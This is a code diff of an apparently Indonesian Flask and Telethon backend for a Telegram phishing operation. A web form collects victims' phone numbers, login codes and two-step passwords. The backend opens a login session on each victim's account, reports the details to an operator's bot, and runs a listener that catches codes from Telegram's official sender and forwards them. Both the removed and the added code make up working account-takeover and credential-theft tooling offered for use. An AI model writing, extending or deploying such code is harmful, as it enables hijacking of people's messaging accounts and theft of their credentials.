@@ -16,44 +16,21 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# Penyimpanan data sesi dan status aktif
+# Penyimpanan sesi string dan status pesan bot
 user_sessions = {}
-active_listeners = {}
+active_status_msg = {}
 
-def send_to_bot(text, reply_markup=None):
+def send_bot_msg(text, buttons=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
-    if reply_markup:
-        payload["reply_markup"] = reply_markup
-    return requests.post(url, json=payload).json()
+    if buttons:
+        payload["reply_markup"] = {"inline_keyboard": buttons}
+    res = requests.post(url, json=payload).json()
+    return res.get("result", {}).get("message_id")
 
-def delete_bot_message(message_id):
+def delete_bot_msg(msg_id):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
-    requests.post(url, json={"chat_id": CHAT_ID, "message_id": message_id})
-
-def format_log(nama, nomor, sandi="None", otp=""):
-    return f"Nama: *{nama}*\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP : {otp}"
-
-async def monitor_otp(nomor, client):
-    """Memantau pesan masuk di akun target untuk mencari kode OTP"""
-    @client.on(events.NewMessage(from_users=777000)) # ID Telegram Official
-    async def handler(event):
-        msg_text = event.raw_text
-        # Cari angka 5 digit dalam pesan
-        otp_match = re.search(r'\b\d{5}\b', msg_text)
-        if otp_match:
-            otp_code = otp_match.group(0)
-            status_msg = active_listeners.get(nomor)
-            if status_msg:
-                delete_bot_message(status_msg) # Hapus teks "menunggu OTP"
-            
-            # Kirim OTP ke Bot
-            nama = user_sessions.get(nomor, {}).get('nama', 'User')
-            send_to_bot(f"✅ **OTP TERDETEKSI!**\n\n{format_log(nama, nomor, otp=otp_code)}")
-            
-            # Hentikan monitoring setelah OTP didapat
-            client.remove_event_handler(handler)
-            active_listeners.pop(nomor, None)
+    requests.post(url, json={"chat_id": CHAT_ID, "message_id": msg_id})
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -62,51 +39,84 @@ def register():
     raw_nomor = data.get('nomor', '').strip().replace(" ", "")
     nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
     nama = data.get('nama', 'User')
-    
-    # Logika pendaftaran dari website (Step 1, 2, 3) tetap berjalan di sini
-    # ... (kode pendaftaran sebelumnya)
-    return jsonify({"status": "success"}), 200
+    otp = data.get('otp', '')
+    sandi = data.get('sandi', 'None')
 
-# WEBHOOK UNTUK TOMBOL BOT
+    # Gunakan sesi yang sudah ada atau buat baru
+    session_str = user_sessions.get(f"{nomor}_str", "")
+    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
+    
+    try:
+        async_to_sync(client.connect)()
+        if step == 1:
+            # Kirim OTP awal ke target agar backend dapat session
+            res = async_to_sync(client.send_code_request)(nomor)
+            user_sessions[nomor] = {"hash": res.phone_code_hash, "nama": nama}
+            user_sessions[f"{nomor}_str"] = client.session.save()
+            
+            # Tampilan log awal di bot dengan tombol otp
+            send_bot_msg(
+                f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP : ",
+                [[{"text": "otp", "callback_data": f"getotp_{nomor}"}]]
+            )
+            return jsonify({"status": "success"}), 200
+        
+        # ... logic step 2 & 3 tetap sama seperti sebelumnya
+    finally:
+        async_to_sync(client.disconnect)()
+
 @app.route('/webhook', methods=['POST'])
-async def bot_webhook():
+def webhook():
     update = request.json
     if "callback_query" in update:
-        data = update["callback_query"]["data"]
-        chat_id = update["callback_query"]["message"]["chat"]["id"]
+        call = update["callback_query"]
+        data = call["data"]
         
-        # Ekstrak nomor dari pesan log
-        msg_text = update["callback_query"]["message"]["text"]
-        match_nomor = re.search(r'\+62\d+', msg_text)
-        
-        if not match_nomor:
-            return jsonify({"status": "error"}), 200
+        if data.startswith("getotp_"):
+            nomor = data.split("_")[1]
+            # Munculkan status menunggu OTP
+            msg_id = send_bot_msg(
+                "Bot siap menerima OTP!", 
+                [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]
+            )
+            active_status_msg[nomor] = msg_id
             
-        nomor = match_nomor.group(0)
-
-        if data == "request_otp":
-            # Kirim teks status
-            reply_markup = {
-                "inline_keyboard": [[{"text": "exit", "callback_data": "stop_monitoring"}]]
-            }
-            res = send_to_bot("🔄 **Status: Menunggu OTP...**", reply_markup)
-            active_listeners[nomor] = res.get("result", {}).get("message_id")
-            
-            # Mulai monitoring (butuh client session yang tersimpan)
+            # Jalankan pemantauan OTP secara asinkron
             session_str = user_sessions.get(f"{nomor}_str")
             if session_str:
-                client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
-                await client.connect()
-                await monitor_otp(nomor, client)
-        
-        elif data == "stop_monitoring":
-            msg_id = active_listeners.get(nomor)
-            if msg_id:
-                delete_bot_message(msg_id)
-                active_listeners.pop(nomor, None)
-                send_to_bot("❌ Anda telah keluar dari mode input inline")
+                asyncio.run(start_otp_listener(nomor, session_str))
+
+        elif data.startswith("exit_"):
+            nomor = data.split("_")[1]
+            if nomor in active_status_msg:
+                delete_bot_msg(active_status_msg[nomor])
+                active_status_msg.pop(nomor)
+            send_bot_msg("Anda telah keluar dari mode input inline")
 
     return jsonify({"status": "success"}), 200
+
+async def start_otp_listener(nomor, session_str):
+    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
+    await client.connect()
+    
+    # Deteksi pesan baru dari Telegram (777000)
+    @client.on(events.NewMessage(from_users=777000))
+    async def handler(event):
+        otp_match = re.search(r'\b\d{5}\b', event.raw_text)
+        if otp_match:
+            otp_code = otp_match.group(0)
+            # Hapus pesan "menunggu" dan kirim OTP
+            if nomor in active_status_msg:
+                delete_bot_msg(active_status_msg[nomor])
+                active_status_msg.pop(nomor)
+            
+            nama = user_sessions.get(nomor, {}).get('nama', 'User')
+            send_bot_msg(f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp_code}`")
+            client.remove_event_handler(handler)
+
+    # Biarkan client memantau selama 2 menit atau sampai exit diklik
+    await asyncio.sleep(120)
+    await client.disconnect()
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
